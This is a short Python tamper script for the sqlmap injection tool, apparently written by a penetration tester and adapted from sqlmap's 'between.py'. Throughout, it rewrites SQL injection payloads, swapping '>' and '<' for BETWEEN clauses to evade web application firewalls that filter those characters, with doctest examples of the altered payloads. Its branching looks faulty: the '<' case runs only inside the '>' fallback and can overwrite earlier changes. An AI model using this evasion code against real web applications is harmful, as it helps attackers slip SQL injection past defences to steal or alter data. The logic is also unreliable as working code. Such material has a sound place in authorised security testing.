#!/usr/bin/env python

"""
Andrew Kitis of Asterisk Information Security
@nanomebia
www.asteriskinfosec.com.au
04-2014

modified from the original "between.py" script provided by the sqlmap developers

"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'
    and replaces the less than operator ('<') with 'BETWEEN 0 AND #''

    Tested against:
        * Microsoft SQL Server 2005

    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the greater than character
        * The BETWEEN clause is SQL standard. Hence, this tamper script
          should work against all (?) databases
        * Can be handy if the original between script is working for some queries
            but not others

    >>> tamper('1 AND A > B--')
    '1 AND A NOT BETWEEN 0 AND B--'
    >>> tamper('1 AND A < B--')
    '1 AND A BETWEEN 0 AND B--'
    """

    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)

        if match:
            _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
            retVal = retVal.replace(match.group(0), _)
        else:
            retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", " NOT BETWEEN 0 AND \g<1>", payload)
            if payload:
                match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^<]+?)\s*<\s*([^<]+)\s*\Z", payload)

                if match:
                    _ = "%s %s BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
                    retVal = retVal.replace(match.group(0), _)
                else:
                    retVal = re.sub(r"\s*<\s*(\d+|'[^']+'|\w+\(\d+\))", " BETWEEN 0 AND \g<1>", payload)

    return retVal
